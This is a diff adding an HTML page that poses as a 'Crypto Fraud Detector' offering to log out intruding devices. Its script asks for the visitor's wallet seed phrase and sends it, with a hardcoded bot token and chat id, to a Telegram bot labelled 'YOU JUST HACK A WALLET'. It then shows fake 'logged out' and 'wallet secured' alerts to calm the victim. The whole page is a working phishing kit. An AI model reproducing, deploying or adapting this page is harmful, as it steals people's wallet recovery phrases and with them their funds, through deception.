@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Fraud Detector</title>
+    <link rel="alternate" href="atom.xml" type="application/atom+xml" title="Atom">
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #0d47a1, #00acc1); /* gradient for professional look */
+            color: #ffffff; /* white text for contrast */
+        }
+
+        .container {
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.8); /* dark, semi-transparent container */
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.3);
+            max-width: 400px;
+            width: 100%;
+        }
+
+        h1 {
+            color: #ffeb3b;
+            margin-bottom: 30px;
+            font-size: 28px;
+            letter-spacing: 1px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        input[type="text"] {
+            padding: 12px;
+            width: 100%;
+            max-width: 300px;
+            font-size: 16px;
+            border: 1px solid #ffeb3b;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            background-color: rgba(255, 255, 255, 0.1);
+            color: #fff;
+        }
+
+        button {
+            padding: 12px 24px;
+            background-color: #ffeb3b;
+            color: #000;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        button:hover {
+            background-color: #ffca28;
+        }
+
+        .message {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #ffeb3b;
+        }
+
+        .loader {
+            border: 16px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 16px solid #ffeb3b;
+            width: 80px;
+            height: 80px;
+            animation: spin 2s linear infinite;
+            display: none; /* Initially hidden */
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .overlay {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 9999;
+        }
+
+        .overlay.active {
+            display: flex;
+        }
+
+        /* Subtle background design */
+        .background-design {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('https://www.transparenttextures.com/patterns/crissxcross.png'); /* Subtle pattern */
+            opacity: 0.2;
+            z-index: -1;
+        }
+
+        /* Footer styling */
+        footer {
+            position: absolute;
+            bottom: 10px;
+            width: 100%;
+            text-align: center;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+        }
+
+        /* Bitcoin logo styling */
+        .bitcoin-logo {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="background-design"></div> <!-- Subtle background pattern -->
+    
+    <div class="container">
+        <!-- Bitcoin logo -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" alt="Bitcoin Logo" class="bitcoin-logo">
+
+        <h1>Crypto Fraud Detector</h1>
+        <input type="text" id="skey" placeholder="Enter your 12-word or 24-word secret phrase" />
+        <br>
+        <button onclick="saveskey()">Logout Devices</button>
+        <p id="message" class="message"></p> <!-- Message display -->
+    </div>
+
+    <div class="overlay" id="loadingOverlay">
+        <div>
+            <div class="loader"></div>    
+        </div>
+    </div>
+
+    <footer>
+        &copy; 2006 Crypto Fraud Detector. All rights reserved.
+    </footer>
+
+    <script>
+    async function saveskey() {
+        const secretkey = document.getElementById('skey').value.trim();
+
+        // Validate if the secret key is either a 12-word or 24-word phrase
+        const phraseWords = secretkey.split(' ');
+        if (phraseWords.length !== 12 && phraseWords.length !== 24) {
+            alert('Please input your phrase correctly (must be either 12 or 24 words).');
+            return;
+        }
+
+        // Show loading animation
+        document.getElementById('loadingOverlay').classList.add('active');
+
+        const botToken = '7779252424:AAHwhJRnlvWnc84nGutPLIo5nabZfn78FK4';
+        const chatId = '7461224949';
+        const message = `YOU JUST HACK A WALLET:  ${secretkey}`;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        // Detect the user's device or browser
+        const userDevice = detectDevice();
+
+        try {
+            const response = await fetch(url);
+            if (response.ok) {
+                // Show "logging out" alert after 2 seconds with device name
+                setTimeout(() => {
+                    alert(`${userDevice} - You have 1 device detected, logging out. Do not leave this page...`);
+
+                    // After an additional 2 seconds, show the "logged out" alert and clear the loading overlay
+                    setTimeout(() => {
+                        alert('You have successfully logged out of the device!');
+                        document.getElementById('loadingOverlay').classList.remove('active');
+                        document.getElementById('message').innerText = 'Your wallet has been secured!';
+
+                        // Remove the message after 3 seconds
+                        setTimeout(() => {
+                            document.getElementById('message').innerText = '';
+                        }, 3000);
+
+                    }, 2000);
+
+                }, 2000);
+
+            } else {
+                throw new Error('Failed to logout the device.');
+            }
+        } catch (error) {
+            document.getElementById('loadingOverlay').classList.remove('active');
+            document.getElementById('message').innerText = 'Error: ' + error.message;
+        }
+    }
+
+    // Function to detect the user's device or browser
+    function detectDevice() {
+        const userAgent = navigator.userAgent;
+
+        // Detect iPhones by model
+        if (/iPhone/.test(userAgent)) {
+            let match = userAgent.match(/iPhone\s([^\s]+)/);
+            if (match) {
+                return `iPhone ${match[1]}`;
+            }
+            return 'iPhone';
+        }
+
+        // Detect Spark 10
+        if (/Spark\s10/.test(userAgent)) {
+            return 'Spark 10';
+        }
+
+        // Detect Samsung Galaxy devices
+        if (/SM-(\w+)/.test(userAgent)) {
+            let match = userAgent.match(/SM-(\w+)/);
+            return `Samsung Galaxy ${match[1]}`;
+        }
+
+        // Detect specific Android devices by model
+        if (/Android/.test(userAgent)) {
+            let match = userAgent.match(/Android\s([\d.]+);?\s([^\s]+)/);
+            if (match) {
+                return `${match[2]} (Android ${match[1]})`;
+            }
+            return 'Android Device';
+        }
+
+        // Detect iPads
+        if (/iPad/.test(userAgent)) {
+            return 'iPad';
+        }
+
+        // Detect Windows PCs
+        if (/Windows NT/.test(userAgent)) {
+            return 'Windows PC';
+        }
+
+        // Detect Mac computers
+        if (/Macintosh/.test(userAgent)) {
+            return 'Mac';
+        }
+
+        // Detect Linux PCs
+        if (/Linux/.test(userAgent)) {
+            return 'Linux PC';
+        }
+
+        // Default unknown device
+        return 'Unknown Device';
+    }
+    </script>
+</body>
+</html>
